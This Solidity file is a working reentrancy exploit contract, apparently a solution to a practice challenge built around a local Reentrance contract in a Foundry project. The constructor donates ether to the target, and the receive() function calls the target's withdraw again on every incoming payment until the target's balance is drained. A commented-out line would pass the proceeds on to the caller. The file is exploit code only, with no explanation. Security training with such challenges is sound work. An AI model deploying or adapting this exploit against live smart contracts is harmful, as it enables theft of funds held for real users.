// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import {console} from "forge-std/console.sol";
import {Reentrance} from "./Reentrance.sol";

contract ReentranceExploit {
    mapping(address => uint256) public balances;
    Reentrance private _target;

    constructor(Reentrance _targetContract) payable {
        _target = _targetContract;
        _target.donate{value: msg.value}(address(this));
    }

    function withdraw(uint256 _amount) public {
        console.log("calling Withdraw");
        _target.withdraw(_amount);
        // (bool res, ) = msg.sender.call{value: address(this).balance}("");
        // require(res, "Failed to withdraw");
    }

    receive() external payable {
        console.log("[Exploit-receive()]: balance: ", address(this).balance);
        if (address(_target).balance >= msg.value) {
            _target.withdraw(msg.value);
        }
    }
}
